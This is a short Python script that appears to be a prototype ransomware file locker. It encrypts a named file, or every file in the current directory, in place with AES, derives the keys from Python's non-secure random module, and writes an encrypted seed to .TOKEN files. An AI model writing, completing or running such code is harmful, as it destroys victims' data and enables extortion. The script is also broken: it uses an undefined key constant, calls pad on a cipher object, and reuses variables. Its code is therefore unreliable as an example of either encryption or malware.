"""This file is the file with simple shared key encryption. We also don't include any obfuscation"""

import os
import random
import sys
import Crypto
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP


random.seed(get_random_bytes(32))

KEY = INSECURE_ENCRYPTION_KEY

seed_cipher = AES.new(KEY, AES.MODE_CBC)


def processFile(path):
    if path.lower() == "all":
        files = [f for f in os.listdir(".") if os.path.isfile(f)]
        for f in files:
            seed = random.randbytes(32)
            random.seed(seed)
            encrypted_seed = seed_cipher.encrypt(pad(seed_cipher, AES.block_size))
            cipher = AES.new(random.randbytes(32), AES.MODE_CBC)
            with open(f, "r+b") as f:
                contents = f.read()

                encrypted = cipher.encrypt(pad(contents, AES.block_size))
                f.seek(0)
                f.write(encrypted)

                with open(f"{path}.TOKEN", "w+") as f:
                    f.write(str(encrypted_seed))
        return
    
    seed = random.randbytes(32)
    random.seed(seed)
    encrypted_seed = seed_cipher.encrypt(pad(seed_cipher, AES.block_size))
    cipher = AES.new(random.randbytes(32), AES.MODE_CBC)
    with open(path, "r+b") as f:
        contents = f.read()

        encrypted = cipher.encrypt(pad(contents, AES.block_size))
        f.seek(0)
        f.write(encrypted)

        with open(f"{path}.TOKEN", "w+") as f:
            f.write(str(encrypted_seed))


def main(args):
    cmdArgs = args[1::]
    cmdArgLen = len(cmdArgs)
    print(cmdArgs, cmdArgLen)
    if cmdArgLen < 1:
        print("usage: ./R1.py [input]")
        return

    processFile(cmdArgs[0])


if __name__ == "__main__":
    main(sys.argv)
